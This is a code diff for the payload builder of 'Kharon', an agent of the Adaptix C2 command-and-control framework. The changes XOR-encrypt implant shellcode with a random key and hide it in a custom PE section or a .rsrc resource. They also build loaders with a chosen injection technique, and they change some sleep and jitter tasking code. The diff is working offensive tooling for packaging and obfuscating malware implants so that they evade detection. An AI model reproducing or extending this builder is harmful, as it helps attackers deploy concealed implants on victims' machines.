@@ -25,6 +25,44 @@ import (
 	ax "github.com/Adaptix-Framework/axc2"
 )
 
+type EncryptResult struct {
+	Data   []byte
+	KeyStr string
+}
+
+type EncryptFunc func(data []byte) (EncryptResult, error)
+
+var encryptors = map[string]EncryptFunc{
+	"xor": encryptXor,
+	// "aes": encryptAes,
+	// "rc4": encryptRc4,
+}
+
+func bytesToCKey(key []byte) string {
+	parts := make([]string, len(key))
+	for i, b := range key {
+		parts[i] = fmt.Sprintf("0x%02x", b)
+	}
+	return "{ " + strings.Join(parts, ", ") + " }"
+}
+
+func encryptXor(data []byte) (EncryptResult, error) {
+	key := make([]byte, 16)
+	if _, err := rand.Read(key); err != nil {
+		return EncryptResult{}, err
+	}
+
+	encrypted := make([]byte, len(data))
+	for i := range data {
+		encrypted[i] = data[i] ^ key[i%16]
+	}
+
+	return EncryptResult{
+		Data:   encrypted,
+		KeyStr: bytesToCKey(key),
+	}, nil
+}
+
 func AgentGenerateProfile(agentConfig string, listenerWM string, listenerMap map[string]any) ([]byte, error) {
 
 	/// START CODE
@@ -233,7 +271,7 @@ func AgentGenerateBuild(agentConfig string, agentProfile []byte, listenerMap map
 	forkPipe := cfg.ForkPipe
 	forkPipe = strings.ReplaceAll(forkPipe, `\`, `\\`)
 	forkPipe = strings.ReplaceAll(forkPipe, `"`, `\"`)
-	forkPipeC := fmt.Sprintf("\"%s\"", forkPipe)
+	forkPipeC := fmt.Sprintf("L\\\"%s\\\"", forkPipe)
 
 	// Escape and format Spawnto
 	spawnto := cfg.Spawnto
@@ -383,6 +421,22 @@ func AgentGenerateBuild(agentConfig string, agentProfile []byte, listenerMap map
 	}
 	fmt.Printf("DEBUG: Read %d bytes from output file\n", len(bin))
 
+	encryptionType := strings.ToLower(cfg.EncryptionTechnique)
+	if encryptionType == "" {
+		encryptionType = "none"
+	}
+
+	keyStr := "{ 0 }"
+
+	if encryptFn, ok := encryptors[encryptionType]; ok {
+		result, err := encryptFn(bin)
+		if err != nil {
+			return nil, "", fmt.Errorf("encryption failed: %v", err)
+		}
+		bin = result.Data
+		keyStr = result.KeyStr
+	}
+
 	outFileName := ""
 	var finalBin []byte
 
@@ -401,18 +455,52 @@ func AgentGenerateBuild(agentConfig string, agentProfile []byte, listenerMap map
 		}
 
 		// Generate shellcode header
-		shellcodeHeaderPath := filepath.Join(loaderPath, "Include", "Shellcode.h")
-		fmt.Printf("DEBUG: Generating shellcode header at: %s\n", shellcodeHeaderPath)
-
-		shellcodeContent := gen_shelllcode_header(bin)
-		fmt.Printf("DEBUG: Generated shellcode header (%d bytes)\n", len(shellcodeContent))
-
-		if err := os.WriteFile(shellcodeHeaderPath, []byte(shellcodeContent), 0644); err != nil {
-			fmt.Printf("ERROR: Failed to write Shellcode.h: %v\n", err)
-			return nil, "", fmt.Errorf("failed to write Shellcode.h: %v", err)
+		customSectionName := cfg.CustomSectionName
+		if len(customSectionName) == 0 || len(customSectionName) > 8 {
+			return nil, "", fmt.Errorf("section name must be 1-8 bytes, got %d", len(customSectionName))
 		}
-		fmt.Println("→ Shellcode injected into:", shellcodeHeaderPath)
+		rsrcID := mrand.Intn(50) + 100
+		shellcodeHeaderPath := filepath.Join(loaderPath, "Include", "Shellcode.h")
+		if cfg.PeSection == "rsrc" {
+			rsrcHeader := "#pragma once\n\n#include <cstdint>\n\nnamespace Shellcode {\n    extern uint8_t* Data;\n    extern size_t         Size;\n}\n"
+			if err := os.WriteFile(shellcodeHeaderPath, []byte(rsrcHeader), 0644); err != nil {
+				return nil, "", fmt.Errorf("failed to write Shellcode.h for rsrc: %v", err)
+			}
+			fmt.Println("→ Shellcode.h (rsrc) written to:", shellcodeHeaderPath)
 
+			shellcodeBinPath := filepath.Join(loaderPath, "Include", "shellcode.bin")
+			if err := os.WriteFile(shellcodeBinPath, bin, 0644); err != nil {
+				return nil, "", fmt.Errorf("failed to write shellcode.bin: %v", err)
+			}
+
+			rcContent := fmt.Sprintf("%d RCDATA \"%s\"\n", rsrcID, shellcodeBinPath)
+			rcPath := filepath.Join(loaderPath, "Include", "shellcode.rc")
+			if err := os.WriteFile(rcPath, []byte(rcContent), 0644); err != nil {
+				return nil, "", fmt.Errorf("failed to write shellcode.rc: %v", err)
+			}
+
+			resPath := filepath.Join(loaderPath, "Include", "shellcode.res")
+			stdOut.Reset()
+			stdErr.Reset()
+			windresCmd := exec.Command("x86_64-w64-mingw32-windres", rcPath, "-O", "coff", "-o", resPath)
+			windresCmd.Stdout = &stdOut
+			windresCmd.Stderr = &stdErr
+			if err := windresCmd.Run(); err != nil {
+				return nil, "", fmt.Errorf("windres failed: %v\nstderr:\n%s", err, stdErr.String())
+			}
+			fmt.Println("→ shellcode.res generated for .rsrc embedding")
+
+		} else {
+			shellcodeContent := gen_shellcode_header(bin, cfg.PeSection, customSectionName)
+			fmt.Printf("DEBUG: PeSection: %s\n", cfg.PeSection)
+			fmt.Printf("DEBUG: Generated shellcode header (%d bytes)\n", len(shellcodeContent))
+
+			if err := os.WriteFile(shellcodeHeaderPath, []byte(shellcodeContent), 0644); err != nil {
+				fmt.Printf("ERROR: Failed to write Shellcode.h: %v\n", err)
+				return nil, "", fmt.Errorf("failed to write Shellcode.h: %v", err)
+			}
+			fmt.Println("→ Shellcode injected into:", shellcodeHeaderPath)
+		}
 		var sourceFile string
 		var outputName string
 
@@ -445,44 +533,35 @@ func AgentGenerateBuild(agentConfig string, agentProfile []byte, listenerMap map
 		}
 		fmt.Printf("DEBUG: Created/verified Bin directory: %s\n", binDir)
 
-		includeDir := filepath.Join(loaderPath, "Include")
-
-		clangArgs := []string{
-			"-target", "x86_64-w64-mingw32",
-			"-I", includeDir,
-			"-o", outputPath,
-			sourcePath,
-			"-Os",
-			"-mwindows",
-			"-nostdlib",
-			"-s",
-			"-lkernel32",
-			"-ladvapi32",
+		makeArgs := []string{
+			"-C", loaderPath,
+			"build",
+			fmt.Sprintf("FORMAT=%s", cfg.Format),
+			fmt.Sprintf("SECTION=%s", cfg.PeSection),
+			fmt.Sprintf("CUSTOM_SECTION_NAME=%s", customSectionName),
+			fmt.Sprintf("RSRC_ID=%d", rsrcID),
+			fmt.Sprintf("XOR_KEY=%s", keyStr),
+			fmt.Sprintf("ENCRYPTION_TYPE=%s", encryptionType),
+			fmt.Sprintf("INJECTION_TECHNIQUE=%s", cfg.InjectionTechnique),
 		}
 
-		switch cfg.Format {
-		case "Dll":
-			clangArgs = append(clangArgs, "-shared")
-			fmt.Println("DEBUG: Added -shared flag for DLL compilation")
-		case "Svc":
-			clangArgs = append(clangArgs, "-Wl,-e,WinMain")
-			fmt.Println("DEBUG: Added -e WinMain entry point for Svc compilation")
-		}
+		fmt.Printf("→ Running make: %v\n", makeArgs)
 
-		fmt.Printf("→ Running clang++: %v\n", clangArgs)
+		stdOut.Reset()
+		stdErr.Reset()
 
-		clangCmd := exec.Command("clang++", clangArgs...)
-		clangCmd.Stdout = &stdOut
-		clangCmd.Stderr = &stdErr
+		makeCmd := exec.Command("make", makeArgs...)
+		makeCmd.Stdout = &stdOut
+		makeCmd.Stderr = &stdErr
 
-		fmt.Println("DEBUG: Executing clang++ command...")
-		if err := clangCmd.Run(); err != nil {
-			fmt.Printf("ERROR: clang++ command failed: %v\n", err)
+		fmt.Println("DEBUG: Executing make command...")
+		if err := makeCmd.Run(); err != nil {
+			fmt.Printf("ERROR: make command failed: %v\n", err)
 			fmt.Printf("STDOUT:\n%s\n", stdOut.String())
 			fmt.Printf("STDERR:\n%s\n", stdErr.String())
-			return nil, "", fmt.Errorf("clang++ failed: %v\nstdout:\n%s\nstderr:\n%s", err, stdOut.String(), stdErr.String())
+			return nil, "", fmt.Errorf("make failed: %v\nstdout:\n%s\nstderr:\n%s", err, stdOut.String(), stdErr.String())
 		}
-		fmt.Println("DEBUG: clang++ command completed successfully")
+		fmt.Println("DEBUG: make command completed successfully")
 
 		finalBin, err = os.ReadFile(outputPath)
 		if err != nil {
@@ -1510,8 +1589,6 @@ func CreateTask(ts Teamserver, agent ax.AgentData, args map[string]any) (ax.Task
 			kharon_cfg.Session.SleepTime = uint32(sleepTime * 1000)
 			kharon_cfg.JsonMarshal(&agent, true)
 
-			ModuleObject.ts.TsAgentUpdateData(agent)
-
 			bofParam, _ = PackExtData(int(CONFIG_SLEEP), int(sleepTime))
 			array = []interface{}{TASK_EXEC_BOF, len(bofData), bofData, TASK_CONFIG, len(bofParam), bofParam}
 
@@ -1530,8 +1607,6 @@ func CreateTask(ts Teamserver, agent ax.AgentData, args map[string]any) (ax.Task
 			agent.Jitter = uint(jitterTime)
 			kharon_cfg.Session.Jitter = uint32(jitterTime)
 			kharon_cfg.JsonMarshal(&agent, true)
-
-			ModuleObject.ts.TsAgentUpdateData(agent)
 
 			bofParam, _ = PackExtData(int(CONFIG_JITTER), int(jitterTime))
 			if err != nil {
@@ -1829,7 +1904,6 @@ func CreateTask(ts Teamserver, agent ax.AgentData, args map[string]any) (ax.Task
 			if wdErr != nil {
 				panic(wdErr)
 			}
-
 			postex_path := filepath.Join(filepath.Dir(wd), "dist", "extenders", "agent_kharon", "src_modules")
 
 			bofFile, ok := args["bof_file"].(string)
@@ -1840,7 +1914,6 @@ func CreateTask(ts Teamserver, agent ax.AgentData, args map[string]any) (ax.Task
 			if strings.Contains(bofFile, "kharon_replace_folder") {
 				bofFile = strings.ReplaceAll(bofFile, "kharon_replace_folder", postex_path)
 			}
-
 			var bofContent []byte
 			bofContent, err = base64.StdEncoding.DecodeString(bofFile)
 			if err != nil {
@@ -1916,7 +1989,6 @@ RET:
 
 	return taskData, messageData, err
 }
-
 func ProcessTasksResult(ts Teamserver, agentData ax.AgentData, taskData ax.TaskData, packedData []byte) []ax.TaskData {
 	var outTasks []ax.TaskData
 
